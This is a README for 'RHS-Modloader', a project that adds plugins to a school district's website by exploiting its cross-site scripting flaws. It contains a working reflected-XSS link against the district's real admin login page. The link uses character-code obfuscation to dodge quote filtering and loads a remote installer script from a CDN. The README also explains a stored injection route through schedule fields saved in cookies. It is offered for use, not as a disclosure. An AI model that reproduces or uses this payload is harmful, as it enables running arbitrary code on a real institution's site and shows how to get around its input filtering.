# RHS-Modloader
An extension for the RHS website allowing you to install plugins and code. This is done by taking advantage of multiple HTML injection bugs in the website.

Supported on every device. An electron app will also be added to the releases tab at some point.
The Modloader itself will automatically update, but the electron app might need some app level changes to push to releases

***-- COOKIES WILL NOT WORK ON DAYS WITHOUT SCHOOL --***

(If you prefer a longer link that is much more stable with no install, go [here]())

# Features
- Completely custom theme/plugin support using js/css
- Saving state of enabled plugins/themes
- As this is unfinished, this is not the full list of features. more will be added soon.

# Installation Instructions

-- This will be changed to allow for a one-click install, removing the install process and making it easier for the end user. --
This is outdated, as an update is being developed to remove this nessecity.

As of right now, while it is less automatic, copying the code manaully is much more stable than attempting to change the domain's cookies, so this is reccomended for the time being.

1. Go to the [RHS Modloader website](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Einstall=String.fromCharCode(115,99,114,105,112,116);replace=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,80,111,121,114,97,122,79,122,107,117,115,97,107,115,105,122,47,82,72,83,45,77,111,100,108,111,97,100,101,114,64,109,97,115,116,101,114,47,105,110,115,116,97,108,108,101,114,46,106,115);var%20scriptTag%20=%20document.createElement(install);scriptTag.src%20=%20replace;document.body.appendChild(scriptTag);%3C/script%3E) and click "Copy Code Manually".

2. Go back to the official RHS Website and edit your schedule. If school is not happening on that day, you can change the date by adding ``?date=(year)-(month)-(day)`` to the end of the URL. 

*Month and day must be two digit, so for example use "03" instead of "3"*

3. To the end of every period name, paste the code you have copied. If that period is not present on a day, the code for it will not run. While putting it on 3 or 4 periods would also work for most days, there are some days with weird schedules. If done correctly, you won't see the code again.

# How this works

I have found two ways to add HTML onto the RHS website:

- Through the admin website
- By storing HTML in cookies

These are both forms of XSS as they allow self script injection.

The admin login for the RHS Website lets you directly add code to it using the [URL's error message](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Ch1%3EHello%20RHS!%3C/h1%3E),
and the main website allows it through the schedule tab, which just adds it on as plain text. This is also stored as cookies instead of in the URL, where your schedule is also stored.

While both of these don't like it when you add code directly (they cancel quotes), making strings from char codes is a very nice alternative and runs well.
